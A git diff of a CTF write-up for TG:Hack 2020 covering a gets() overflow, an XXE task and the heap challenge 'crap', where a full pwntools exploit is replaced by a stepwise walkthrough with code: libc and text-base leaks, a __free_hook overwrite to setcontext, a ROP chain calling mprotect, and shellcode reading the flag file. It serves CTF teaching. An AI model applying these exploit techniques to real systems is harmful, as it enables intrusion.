@@ -1,7 +1,8 @@
 # TG:Hack2020
-> 20200411-20200412
 
-## Boofy
+>  Thu, 09 April 2020, 01:00 CST — Sun, 12 April 2020, 01:00 CST 
+
+## Boofy (69pt)
 ### Description
 
 > Author: [**Ingeborg Ytrehus - ingeborg_y#6548**](https://tghack.no/authors#16)
@@ -28,15 +29,15 @@ It's a really easy task. The codes `gets(password)` will overflow the buffer and
 
 ```c
 void try_password(){
-	char password[20] = { 0 };
-	int correct = 0;	
-	printf("Please enter the password?\n");
-	gets(password);
-	if (correct == 1) {
-		get_flag();
-	} else {
-		printf("Sorry, but that's not the right password...\n");
-	}
+    char password[20] = { 0 };
+    int correct = 0;    
+    printf("Please enter the password?\n");
+    gets(password);
+    if (correct == 1) {
+        get_flag();
+    } else {
+        printf("Sorry, but that's not the right password...\n");
+    }
 }
 ```
 
@@ -55,7 +56,7 @@ you can download full exp from my [github](https://github.com/TaQini/ctf/tree/ma
 
 
 
-## Extract this!
+## Extract this! (93pt)
 ### Description
 
 > Extract This!
@@ -83,11 +84,11 @@ It's a xml language parser, so try to [XEE(**X**ML **E**xternal **E**ntity)](htt
 
 
 
-## crap 
+## crap (319pt)
 
 so difficult...
 
-I success in local but fail in remote...
+~~I success in local but fail in remote...~~
 
 ### seccomp rules
 
@@ -120,317 +121,205 @@ I success in local but fail in remote...
 
 ### Solution
 
-!> Note: Only works in local (Ubuntu 19.04 & libc 2.29)
-
-leak `main_arean` by printing `feedback` after free 
-
-leak the base of `text` by searching the value of text base address in library `ld` .
-
-> the offset between libc and ld does not change (in local)
+> ~~Note: Only works in local~~ 
 >
-> but the offset in local is different from it in remote
+> ~~Ubuntu 19.04 & libc 2.29~~ (now it works in both local and remote)
 
-overwrite `write_count`,`read_count` to negative number and clean `feedback` 
+1. leak `main_arean` by printing `feedback` after free 
 
-overwrite `__free_hook` so we can control `rip` after `feedback` was freed
+   ```python
+   sla('> ','3')
+   sla('feedback: ','%15$p'.ljust(8,'a')+ropchain)
+   sla('Do you want to keep your feedback? (y/n)\n','n')
+   stack = eval(rc(14))
+   ```
 
-put `ropchain` and `shellcode` into `feedback` 
+2. leak the base of `text` ~~by searching the value of text base address in library `ld` .~~
 
-trigger rop by overwriting `__free_hook` to  `setcontext` 
+    > the offset between libc and ld does not change (in local)
+    >
+    > but the offset in local is different from it in remote
+    
+    by following operation:
 
-call `mprotect` to make `heap` executable
+    ```c
+    pwndbg> search -8 stdin
+    crap_debug      0x5599c0c26020 0x7f2953aff980
+    libc.so.6       0x7f2953afef90 0x7f2953aff980
+    libc.so.6       0x7f2953b00708 0x7f2953aff980
+    libc.so.6       0x7f2953b00790 0x7f2953aff980
+    [stack]         0x7fff6047bda8 0x7f2953aff980
+    [stack]         0x7fff6047bdd8 0x7f2953aff980
+    [stack]         0x7fff6047be00 0x7f2953aff980
+    [stack]         0x7fff6047be58 0x7f2953aff980
+    pwndbg> search -8 0x5599c0c26020
+    libc.so.6       0x7f2953afefc0 0x5599c0c26020
+    pwndbg> p/x 0x7f2953afefc0-0x7f295374a000
+    $3 = 0x3b4fc0
+    ```
 
-`close(0)` to release `fd0` and open `flag` , `fd0` would be assigned to the flag file
+    >  Unbelievable! There is a ptr in `libc` point to `stdin` in `bss`
 
-read flag and write it
+    ```python
+    stdin = libcbase+0x3b4fc0 
+    text = stdin - 0x202020
+    ```
 
-too lazy to say any more ...
+    > `bss:0000000000202020 ; FILE *stdin `
 
-and so poor python exp I was written... 
+    we can get base of text by leaking `stdin` in .`bss`!!!!!!
 
-```python
-#!/usr/bin/python
-#coding=utf-8
-#__author__:TaQini
+    > Thanks my friend *binLep* told me this amazing thing :D
 
-from pwn import *
+3. overwrite `write_count`,`read_count` to negative number and clean `feedback` 
 
-local_file  = './crap'
-# local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
-remote_libc = '/libc.so.6'
+    ```python
+    main = text + 0x1180
+    write_count = text+write_count_off
+    feedback = write_count+4
+    read_count = write_count-4
+    sla('> ','2')
+    sla('addr/value: ','%s %s'%(hex(read_count),hex(0xffffffdfffffffdf)))
+    sla('> ','2')
+    sla('addr/value: ','%s %s'%(hex(feedback),hex(0)))
+    ```
 
-is_local = False
-is_remote = False
+4. overwrite `__free_hook` so we can control `rip` after `feedback` was freed
 
-# if len(sys.argv) == 1:
-#     is_local = True
-#     p = process(local_file)
-#     libc = ELF(local_libc)
-# elif len(sys.argv) > 1:
-#     is_remote = True
-#     if len(sys.argv) == 3:
-#         host = sys.argv[1]
-#         port = sys.argv[2]
-#     else:
-#         host, port = sys.argv[1].split(':')
-#     p = remote(host, port)
-#     libc = ELF(remote_libc)
+    ```python
+    sla('> ','2')
+    sla('addr/value: ','%s %s'%(hex(free_hook),hex(printf)))
+    ```
 
-# elf = ELF(local_file)
+5. put `ropchain` and `shellcode` into `feedback` (in heap)
 
-def debug(cmd=''):
-    if is_local: gdb.attach(p,cmd)
+    ```python
+    sla('> ','3')
+    sla('feedback: ','%15$p'.ljust(8,'a')+ropchain)
+    sla('Do you want to keep your feedback? (y/n)\n','n')
+    ```
 
-def change_ld(binary, ld):
-    """
-    Force to use assigned new ld.so by changing the binary
-    """
-    if not os.access(ld, os.R_OK): 
-        log.failure("Invalid path {} to ld".format(ld))
-        return None
-          
-    if not isinstance(binary, ELF):
-        if not os.access(binary, os.R_OK): 
-            log.failure("Invalid path {} to binary".format(binary))
-            return None
-        binary = ELF(binary)
- 
-    for segment in binary.segments:
-        if segment.header['p_type'] == 'PT_INTERP':
-            size = segment.header['p_memsz']
-            addr = segment.header['p_paddr']
-            data = segment.data()
-            if size <= len(ld):
-                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
-                return None
-            binary.write(addr, ld.ljust(size, '\0'))
-            if not os.access('./Pwn', os.F_OK): os.mkdir('./Pwn')
-            path = './Pwn/{}_debug'.format(os.path.basename(binary.path))
-            if os.access(path, os.F_OK): 
-                os.remove(path)
-                info("Removing exist file {}".format(path))
-            binary.save(path)    
-            os.chmod(path, 0b111000000) #rwx------
-    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
-    return ELF(path)
+6. trigger rop by overwriting `__free_hook` to  `setcontext` 
 
-# info
+    ```nasm
+    <setcontext+53>:  mov    rsp,QWORD PTR [rdx+0xa0]
+    <setcontext+60>:  mov    rbx,QWORD PTR [rdx+0x80]
+    <setcontext+67>:  mov    rbp,QWORD PTR [rdx+0x78]
+    <setcontext+71>:  mov    r12,QWORD PTR [rdx+0x48]
+    <setcontext+75>:  mov    r13,QWORD PTR [rdx+0x50]
+    <setcontext+79>:  mov    r14,QWORD PTR [rdx+0x58]
+    <setcontext+83>:  mov    r15,QWORD PTR [rdx+0x60]
+    <setcontext+87>:  mov    rcx,QWORD PTR [rdx+0xa8]
+    <setcontext+94>:  push   rcx
+    <setcontext+95>:  mov    rsi,QWORD PTR [rdx+0x70]
+    <setcontext+99>:  mov    rdi,QWORD PTR [rdx+0x68]
+    <setcontext+103>: mov    rcx,QWORD PTR [rdx+0x98]
+    <setcontext+110>: mov    r8,QWORD PTR [rdx+0x28]
+    <setcontext+114>: mov    r9,QWORD PTR [rdx+0x30]
+    <setcontext+118>: mov    rdx,QWORD PTR [rdx+0x88]
+    <setcontext+125>: xor    eax,eax
+    <setcontext+127>: ret    
+    ```
 
-# elf, libc
-elf=change_ld('./crap','./lib/ld-linux-x86-64.so.2')
-if len(sys.argv)>1:
-    is_remote=True
-    p = remote('asia.crap.tghack.no','6001')
-else:
-    is_local=True
-    p = elf.process(env={'LD_PRELOAD':'./lib/libc.so.6','LD_LIBRARY_PATH':'lib'})
-libc = ELF('./lib/libc.so.6')
+    > all regs can be assigned by `setcontext`
 
-# context.log_level = 'debug'
-context.arch = 'amd64'
+    ```python
+    free_hook = libcbase+libc.sym['__free_hook']
+    setcontext = libcbase+0x45ba5
+    sla('> ','2')
+    sla('addr/value: ','%s %s'%(hex(feedback),hex(0)))
+    sla('> ','2')
+    sla('addr/value: ','%s %s'%(hex(free_hook),hex(setcontext)))
+    # config setcontext
+    rsp = libcbase+0x3b5aa4
+    rcx = libcbase+0x3b5aac
+    sla('> ','2')
+    sla('addr/value: ','%s %s'%(hex(rsp),hex(buf)))
+    sla('> ','2')
+    sla('addr/value: ','%s %s'%(hex(rcx),hex(prdi)))
+    sla('> ','3')
+    # trigger free
+    sla('feedback: ',p64(0xdeadbeef)*10)
+    # debug('b free')
+    sla('Do you want to keep your feedback? (y/n)\n','n')
+    ```
 
-se      = lambda data               :p.send(data) 
-sa      = lambda delim,data         :p.sendafter(delim, data)
-sl      = lambda data               :p.sendline(data)
-sla     = lambda delim,data         :p.sendlineafter(delim, data)
-sea     = lambda delim,data         :p.sendafter(delim, data)
-rc      = lambda numb=4096          :p.recv(numb)
-ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
-uu32    = lambda data               :u32(data.ljust(4, '\0'))
-uu64    = lambda data               :u64(data.ljust(8, '\0'))
-info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
+7. call `mprotect` to make `heap` executable
 
-# rop1
-offset = 0
-payload = 'A'*offset
-payload += ''
+    ```python
+    ropchain = p64(prdi) + p64(heap) + p64(prsi) + p64(0x10000) + p64(prdx) + p64(0x7) + p64(mprotect)
+    ```
 
-main_arena_off = 0x7f9652abbbe0 - 0x7f9652706000
-write_count_off = 0x202034
-# debug('b *$reasbe(0xCAD)')
+    ![](http://image.taqini.space/img/20200414004117.png)
 
-sla('> ','3')
-sla('feedback: ','TaQini')
-sla('Do you want to keep your feedback? (y/n)\n','n')
-# debug('b *$rebase(0x1179)')
-sla('> ','4')
-ru('feedback: ')
-main_arena = uu64(rc(6))
-info_addr('main_arena',main_arena)
-libcbase = main_arena - main_arena_off
-info_addr('libcbase',libcbase)
-sla('> ','1')
-leak = main_arena + 0x22e900
-# leak = main_arena + 0x20
-sla('addr: ',hex(leak))
-# sla('addr: ',hex(main_arena))
-ru('value: ')
-text = eval(rc(14))
-info_addr('text',text)
+8. `close(0)` to release `fd0` and open `flag` , `fd0` would be assigned to the flag file
 
-main = text + 0x1180
-write_count = text+write_count_off
-feedback = write_count+4
-read_count = write_count-4
-info_addr('write_count',write_count)
-sla('> ','2')
-sla('addr/value: ','%s %s'%(hex(read_count),hex(0xffffffdfffffffdf)))
-sla('> ','1')
-sla('addr: ',hex(main_arena))
-ru('value: ')
-bss = eval(rc(14))
-info_addr('bss',bss)
-sla('> ','2')
-sla('addr/value: ','%s %s'%(hex(feedback),hex(0)))
+    ```python
+    ropchain += p64(buf+0x40+8)
+    ropchain += asm('''
+                /* close(0) */\n
+                xor edi, edi /* 0 */\n
+                push SYS_close /* 3 */\n
+                pop rax\n
+                syscall\n
+    
+                /* open(flag) */\n
+                push 0x1010101 ^ 0x747874\n
+                xor dword ptr [rsp], 0x1010101\n
+                mov rax, 0x2e67616c662f7061\n
+                push rax\n
+                mov rax, 0x72632f656d6f682f\n
+                push rax\n
+                mov rdi, rsp\n
+                xor edx, edx\n
+                mov dh, 0x100 >> 8\n
+                xor esi, esi /* 0 */\n
+                push SYS_open /* 2 */\n
+                pop rax\n
+                syscall\n
+    
+                /* call read(0,buf,0x40) */\n
+                mov rdi,rax\n
+                mov rsi,%s\n
+                push 0x40\n
+                pop rdx\n
+                push 0x0\n
+                pop rcx\n
+                push 0\n
+                pop rax\n
+                syscall\n
+    
+                /* call write(1,buf,0x40) */\n
+                push 1\r\n
+                pop rdi\n
+                mov rsi,%s\n
+                push 0x40\n
+                pop rdx\n
+                push 0x0\n
+                pop rcx\n
+                push 1\n
+                pop rax\n
+                syscall\n
+        '''%(buf+0x100,buf+0x100)
+        )
+    ```
 
-# gadget
-prbp = text+0x0000000000000bd0 # pop rbp ; ret
-prdi = text+0x0000000000001283 # pop rdi ; ret
-prsi = libcbase+0x0000000000022192 # pop rsi ; ret
-prdx = libcbase+0x0000000000001b9a # pop rdx ; ret
-leave = libcbase+0x0000000000040222 # leave ; ret
-ret = libcbase+0x0000000000000280 # ret
-syscall = libcbase+0xf0bd5 # syscall
-prax = libcbase+0x0000000000038e88 # pop rax ; ret
+9. read flag and write it
 
-# func
-open = libcbase+libc.sym['open']
-read = libcbase+libc.sym['read']
-write = libcbase+libc.sym['write']
-printf = libcbase+libc.sym['printf']
-fgets = libcbase+libc.sym['fgets']
-mprotect = libcbase+libc.sym['mprotect']
-stderr = libcbase+libc.sym['stderr']
-free_hook = libcbase+libc.sym['__free_hook']
-setcontext = libcbase+0x45ba5
+10. ~~too lazy to say any more ... and so poor python exp I was written...~~ [exp](https://github.com/TaQini/ctf/tree/master/TG:HACK2020/pwn/crap) 
 
-info_addr('free_hook',free_hook)
-info_addr('printf',printf)
-# 0x7f7a73e74ba5
+### More
 
-sla('> ','2')
-sla('addr/value: ','%s %s'%(hex(free_hook),hex(printf)))
+you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/TG:HACK2020/pwn/crap) 
 
-buf = bss-0x1260
-info_addr('buf',buf)
-heap = bss-0x32f0
-# open('/flag',0,0x100)
-# ropchain = p64(prdi) + p64(buf+0x108) + p64(prsi) + p64(0) + p64(prdx) + p64(0x100) + p64(prax) + p64(2) + p64(syscall)
-# mprotect(buf,0x1000,7)
-# ropchain += p64(main)
-ropchain = p64(prdi) + p64(heap) + p64(prsi) + p64(0x10000) + p64(prdx) + p64(0x7) + p64(mprotect)
-ropchain += p64(buf+0x40+8)
-ropchain += asm('''
-L1:
-        /* open(file='/home/crap/flag.txt', oflag=0, mode=256) */\n
-        /* push '/home/crap/flag.txt\x00' */\n
-        push 0x1010101 ^ 0x747874\n
-        xor dword ptr [rsp], 0x1010101\n
-        mov rax, 0x2e67616c662f7061\n
-        push rax\n
-        mov rax, 0x72632f656d6f682f\n
-        push rax\n
-        mov rdi, rsp\n
-        xor edx, edx\n
-        mov dh, 0x100 >> 8\n
-        xor esi, esi /* 0 */\n
-        /* call open() */\n
-        push SYS_open /* 2 */\n
-        pop rax\n
-        syscall\n
+> now this challenge is online @ [ctf.taqini.space](http://ctf.taqini.space)
 
-        pop rcx\n /* stack balance */
-        pop rcx\n /* stack balance */
-        pop rcx\n /* stack balance */
-        cmp eax,0\n
-        jns L1\n
-
-        /* close(fd=0) */\n
-        xor edi, edi /* 0 */\n
-        /* call close() */\n
-        push SYS_close /* 3 */\n
-        pop rax\n
-        syscall\n
-
-        /* open(file='/home/crap/flag.txt', oflag=0, mode=256) */\n
-        /* push '/home/crap/flag.txt\x00' */\n
-        push 0x1010101 ^ 0x747874\n
-        xor dword ptr [rsp], 0x1010101\n
-        mov rax, 0x2e67616c662f7061\n
-        push rax\n
-        mov rax, 0x72632f656d6f682f\n
-        push rax\n
-        mov rdi, rsp\n
-        xor edx, edx\n
-        mov dh, 0x100 >> 8\n
-        xor esi, esi /* 0 */\n
-        /* call open() */\n
-        push SYS_open /* 2 */\n
-        pop rax\n
-        syscall\n
-
-        push 0\r\n
-        pop rdi\n
-        mov rsi,%s\n
-        push 0x100\n
-        pop rdx\n
-        push 0x0\n
-        pop rcx\n
-        push 0\n
-        pop rax\n
-        syscall\n
-
-        push 1\r\n
-        pop rdi\n
-        mov rsi,%s\n
-        push 0x100\n
-        pop rdx\n
-        push 0x0\n
-        pop rcx\n
-        push 1\n
-        pop rax\n
-        syscall\n
-
-    '''%(buf,buf)
-    )
-
-# ropchain += p64(prdi) + p64(feedback) + p64(prsi) + p64(0x100) + p64(prdx) + p64(stderr) + p64(fgets)
- # + p64(0) + p64(syscall)
-# ropchain = ropchain.ljust(0x100,'\x90') + '/flag\0\0\0'
-
-sla('> ','3')
-sla('feedback: ','%15$p'.ljust(8,'a')+ropchain)
-sla('Do you want to keep your feedback? (y/n)\n','n')
-stack = eval(rc(14))
-retaddr = stack + 8 -280
-info_addr('retaddr',retaddr)
-# debug('b *$rebase(0x0010DD)')
-# debug('')
-
-sla('> ','2')
-sla('addr/value: ','%s %s'%(hex(feedback),hex(0)))
-sla('> ','2')
-sla('addr/value: ','%s %s'%(hex(free_hook),hex(setcontext)))
-rsp = libcbase+0x3b5aa4
-rcx = libcbase+0x3b5aac
-sla('> ','2')
-sla('addr/value: ','%s %s'%(hex(rsp),hex(buf)))
-
-sla('> ','2')
-sla('addr/value: ','%s %s'%(hex(rcx),hex(prdi)))
-
-sla('> ','3')
-sla('feedback: ',p64(0xdeadbeef)*10)
-# debug('b free')
-sla('Do you want to keep your feedback? (y/n)\n','n')
-# sla('> ','2')
-# sla('addr/value: ','%s %s'%(hex(retaddr),hex(read)))
-
-print rc()
-# info_addr('tag',addr)
-# log.warning('--------------')
-
-p.interactive()
-
+```shell
+nc ctf.taqini.space 10111
 ```
 
+### Other wp
+[wp of Will's Root](ctf/TGHACK-2020/wp_of_Will)
+
+### Great artical
+[Pivoting Around Memory](https://nickgregory.me/security/2019/04/06/pivoting-around-memory/)
